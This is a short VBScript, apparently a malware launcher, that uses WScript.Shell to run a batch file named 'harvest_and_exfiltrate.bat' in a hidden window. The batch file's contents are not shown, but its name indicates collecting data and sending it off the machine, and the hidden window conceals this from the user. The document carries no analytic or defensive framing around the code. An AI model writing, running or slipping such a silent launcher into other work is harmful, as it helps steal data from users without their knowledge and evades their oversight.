Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "harvest_and_exfiltrate.bat" & chr(34), 0
Set WshShell = Nothing
